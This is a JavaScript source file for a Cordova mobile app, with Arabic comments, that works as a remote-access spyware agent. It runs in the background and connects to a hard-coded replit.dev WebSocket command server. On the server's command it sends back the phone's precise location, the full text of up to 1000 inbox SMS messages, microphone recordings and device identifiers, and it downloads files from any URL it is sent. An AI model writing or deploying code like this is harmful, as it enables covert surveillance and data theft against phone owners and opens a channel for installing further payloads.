

document.addEventListener('deviceready', onDeviceReady, false);

// قائمة لتخزين الطلبات المستلمة
const receivedRequests = [];

function onDeviceReady() {
  console.log('Device is ready');
  
  // تفعيل التشغيل في الخلفية
  if (window.cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
    cordova.plugins.backgroundMode.setDefaults({
      title: "نظام المراقبة يعمل",
      text: "جارٍ تنفيذ المهام في الخلفية",
      icon: "icon" // اسم أيقونة التطبيق
    });
    
    cordova.plugins.backgroundMode.on('activate', function() {
      cordova.plugins.backgroundMode.disableWebViewOptimizations();
    });
  }

  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

function connectToServer(deviceInfo) {
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        
        // تخزين الطلب في القائمة
        receivedRequests.push({
          id: data.command.commandId || Date.now(),
          type: data.command.type,
          timestamp: new Date().toISOString(),
          status: 'received'
        });
        
        executeCommand(data.command, (response) => {
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
      
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    setTimeout(() => connectToServer(deviceInfo), 10000);
  };
  
  const heartbeatInterval = setInterval(() => {
    if (wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString(),
        receivedRequests: receivedRequests.slice(-10) // إرسال آخر 10 طلبات
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  const commandId = command.commandId || Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_requests':
      getReceivedRequests(commandId, callback);
      break;
    case 'download_file':
      downloadFile(commandId, command.fileUrl, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: position.timestamp
      };
      
      // إنشاء رابط خريطة جوجل
      const mapUrl = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
      locationData.mapUrl = mapUrl;
      
      callback({
        commandId,
        status: 'success',
        location: locationData
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: error
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 1000, // زيادة عدد الرسائل المسحوبة
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      // عرض محتوى الرسائل كاملاً
      const fullMessages = messages.map(msg => ({
        id: msg._id,
        address: msg.address,
        body: msg.body, // نص الرسالة كاملاً
        date: new Date(msg.date).toISOString(),
        read: msg.read,
        type: 'received'
      }));
      
      callback({
        commandId,
        status: 'success',
        count: fullMessages.length,
        messages: fullMessages
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

let mediaRecorder;
let audioFile;

function recordAudio(commandId, duration, callback) {
  duration = duration || 10;
  
  const src = 'myrecording.mp3';
  audioFile = new Media(src, 
    () => {
      console.log('Media created');
      audioFile.startRecord();
      
      setTimeout(() => {
        audioFile.stopRecord();
        audioFile.play(); // اختبار التسجيل
        
        // الحصول على معلومات الملف
        window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory + src, (fileEntry) => {
          fileEntry.file((file) => {
            callback({
              commandId,
              status: 'success',
              audio: {
                duration: duration,
                format: 'mp3',
                size: file.size,
                filePath: fileEntry.toURL(),
                fileName: src
              }
            });
          });
        }, (error) => {
          callback({ 
            commandId,
            status: 'error',
            error: 'File error',
            details: error
          });
        });
      }, duration * 1000);
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Recording error',
        details: error
      });
    }
  );
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests
  });
}

function downloadFile(commandId, fileUrl, callback) {
  const fileTransfer = new FileTransfer();
  const uri = encodeURI(fileUrl);
  const fileName = fileUrl.split('/').pop();
  const filePath = cordova.file.externalDataDirectory + fileName;
  
  fileTransfer.download(
    uri,
    filePath,
    (entry) => {
      callback({
        commandId,
        status: 'success',
        file: {
          name: fileName,
          path: entry.toURL(),
          size: entry.size
        }
      });
    },
    (error) => {
      callback({
        commandId,
        status: 'error',
        error: 'Download failed',
        details: error
      });
    },
    true
  );
}
